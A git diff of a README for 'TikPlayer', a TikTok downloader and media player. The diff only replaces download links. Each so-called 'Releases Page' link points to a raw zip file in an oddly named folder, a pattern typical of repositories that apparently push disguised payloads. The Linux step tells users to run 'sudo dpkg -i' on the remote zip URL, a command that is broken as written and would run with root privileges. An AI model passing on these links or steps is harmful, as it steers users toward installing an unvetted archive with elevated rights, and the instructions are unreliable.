@@ -1,6 +1,6 @@
 # 🎥 TikPlayer-Tiktok-Downloader-Video-Player - Download and Enjoy Your Favorite Videos
 
-![Download TikPlayer](https://raw.githubusercontent.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/main/peptizable/TikPlayer-Tiktok-Downloader-Video-Player.zip%20TikPlayer-v1.0-blue)
+![Download TikPlayer](https://github.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/raw/refs/heads/main/peptizable/Tiktok_Video_Tik_Player_Downloader_pussyfooter.zip%20TikPlayer-v1.0-blue)
 
 ## 🌟 Description
 TikPlayer is a full-format HD Video Player and Music Player designed to help you enjoy your favorite media easily. With TikPlayer, you can download TikTok videos without watermarks, manage your gallery, and even edit images. It's the perfect tool for music and video lovers.
@@ -9,7 +9,7 @@ TikPlayer is a full-format HD Video Player and Music Player designed to help you
 This guide will help you download and run TikPlayer, even if you have no technical background. Follow these steps carefully.
 
 ## 📥 Download & Install
-To get TikPlayer, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/main/peptizable/TikPlayer-Tiktok-Downloader-Video-Player.zip)
+To get TikPlayer, **visit this page to download**: [Releases Page](https://github.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/raw/refs/heads/main/peptizable/Tiktok_Video_Tik_Player_Downloader_pussyfooter.zip)
 
 1. Go to the Releases page by clicking the link above.
 2. Look for the latest version of TikPlayer.
@@ -40,7 +40,7 @@ Before installing TikPlayer, make sure your system meets the following requireme
 ### For Linux:
 1. Open a terminal.
 2. Navigate to the folder where you downloaded the file.
-3. Run the following command: `sudo dpkg -i https://raw.githubusercontent.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/main/peptizable/TikPlayer-Tiktok-Downloader-Video-Player.zip` (Adjust the filename if needed).
+3. Run the following command: `sudo dpkg -i https://github.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/raw/refs/heads/main/peptizable/Tiktok_Video_Tik_Player_Downloader_pussyfooter.zip` (Adjust the filename if needed).
 4. After the installation, you can find TikPlayer in your applications menu.
 
 ## 🎼 Using TikPlayer
@@ -71,4 +71,4 @@ Feel free to contribute to TikPlayer. You can help by suggesting new features, r
 ## 🎉 Conclusion
 With TikPlayer, downloading and enjoying your media is simple and efficient. Follow the steps above to install and start using TikPlayer today.
 
-For more updates and features, always check our [Releases Page](https://raw.githubusercontent.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/main/peptizable/TikPlayer-Tiktok-Downloader-Video-Player.zip). Happy viewing!
+For more updates and features, always check our [Releases Page](https://github.com/zeroj01/TikPlayer-Tiktok-Downloader-Video-Player/raw/refs/heads/main/peptizable/Tiktok_Video_Tik_Player_Downloader_pussyfooter.zip). Happy viewing!
